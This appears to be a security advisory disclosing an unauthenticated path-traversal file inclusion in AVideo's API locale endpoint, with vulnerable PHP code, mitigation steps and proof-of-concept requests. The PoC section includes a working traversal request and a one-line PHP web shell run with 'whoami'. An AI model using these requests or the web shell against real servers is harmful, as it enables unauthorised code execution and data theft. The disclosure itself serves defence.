summary: "AVideo has an Unauthenticated Local File Inclusion in API locale (RCE possible with\
  \ writable PHP)\n### Summary\nAn unauthenticated API endpoint (`APIName=locale`) concatenates\
  \ user input into an `include` path with no canonicalization or whitelist. Path traversal\
  \ is accepted, so arbitrary PHP files under the web root can be included. In our test this\
  \ yielded confirmed file disclosure and code execution of existing PHP content (e.g., `view/about.php`),\
  \ and it *can* escalate to RCE if an attacker can place or control a PHP file elsewhere in\
  \ the tree. \n### Details\n- Entry point: `plugin/API/get.json.php` sets `$global['bypassSameDomainCheck']=1`\
  \ and merges GET/POST/JSON into `$parameters` without authentication or API secret.\n- Handler:\
  \ `plugin/API/API.php`, method `get_api_locale()` (lines ~5009–5023):\n  ```php\n  $parameters['language']\
  \ = strtolower($parameters['language']);\n  $file = \"{$global['systemRootPath']}locale/{$parameters['language']}.php\"\
  ;\n  if (!file_exists($file)) { return new ApiObject(\"This language does not exists\"); }\n\
  \  include $file;\n  ```\n  No validation is performed; `../` traversal is accepted.\n- Because\
  \ `include` executes PHP, any reachable PHP file is executed in the web server context.\n\n\
  ### PoC\n1. Fetch an arbitrary PHP file (no auth):\n   ```\n   GET /plugin/API/get.json.php?APIName=locale&language=../view/about\
  \ HTTP/1.1\n   Host: <target>\n   ```\n   Response returns the rendered About page HTML, proving\
  \ traversal outside `locale/`.\n2. RCE with an attacker PHP file (any writable PHP path):\n\
  \   ```\n   GET /plugin/API/get.json.php?APIName=locale&language=../videos/locale/shell&x=whoami\n\
  \   ```\n   If `shell.php` contains `<?php system($_GET['x']); ?>`, the response includes\
  \ command output.\n\n### Impact\n- Unauthenticated file inclusion of arbitrary PHP files under\
  \ the web root.\n- Confidential data leakage (e.g., configuration, secrets) via included PHP\
  \ that renders output.\n- Potential RCE *if* any attacker-writable PHP file exists elsewhere\
  \ (not confirmed in this build).\n- Affects any deployment with the API plugin enabled (default\
  \ in docker-compose).\n\n### Mitigation\n- Reject path separators/dots and enforce a strict\
  \ allowlist of locale slugs.\n- `realpath` the target and ensure it stays within `$systemRootPath/locale`.\n\
  - Stop using `include` for translations; load data from vetted formats (JSON/array).\n- Add\
  \ authentication (API secret/token) to the endpoint as a secondary control."
